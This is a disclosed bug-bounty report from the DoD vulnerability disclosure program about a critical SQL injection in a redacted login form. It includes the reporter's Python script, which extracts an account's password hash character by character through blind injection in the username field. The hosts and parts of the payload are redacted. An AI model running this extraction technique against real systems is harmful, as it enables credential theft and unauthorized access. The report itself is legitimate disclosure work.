---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
date: 2020-09-29
submitted: 2020-09-14T21:00:44.360Z
bounty_usd: null
votes: 10
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "erbbysam"
source: "https://hackerone.com/reports/982202"
title: "SQLi in login form of █████"
---
# SQLi in login form of █████

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 10 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2020-09-29

- Report: [https://hackerone.com/reports/982202](https://hackerone.com/reports/982202)
- CWE: SQL Injection
- Submitted: 2020-09-14T21:00:44.360Z

## Timeline

- **Report Filed**
- **2020-09-14** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request ███████ditional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Needs More Info**
- **Report New**
- **2020-09-15** @erbbysam: This is the script I ended up using for gathering data from this sqli as sqlmap did not work (this is configured to grab the user `████`'s password hash):
```
import requests

he██████ers = {'Content-Type': 'application/x-www-form-urlencoded'}
field = 'pwd'
id='██████6'
prefix = ""

while True:

    hit = False
    for i in range(48,90):
        dataInput="usr=asdf'/**/and/**/lastName/**/in/**/(select/**/CASE/**/WHEN/**/((SELECT/**/qqqq/**/FROM/**/accounts/**/WHERE/**/id="+id+")='zzzz')/**/THEN/**/'a'/**/ELSE/**/██████/**/END)/**/and/**/usr!='&pwd=█████"
        dataInput = dataInput.replace('qqqq','substring('+field+',███,'+str(len(prefix)+█████)+')')
        dataInput = dataInput.replace('zzzz',prefix+chr(i))
        r = requests.post('https://█████/███.asp', data=dataInput, verify=False, allow_redirects=False, he████████ers=he██████ers)
        if r.status_code == 500:
            print("HIT "+chr(i))
            prefix = prefix + chr(i)
            hit = True
            break

    if hit == False:
        print("all done -- "+prefix)
        break
```

This eventually printed out `all done -- █████████` when I ran it previously.
- **Report Severity Updated**
- **Report Triaged**
- **2020-09-15** @agent-l8: @erbbysam great find, great follow through and fantastic write up!
- **2020-09-25** @erbbysam: It looks like this has been resolved as https://███████/ is no longer online.
Thanks,
Sam
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
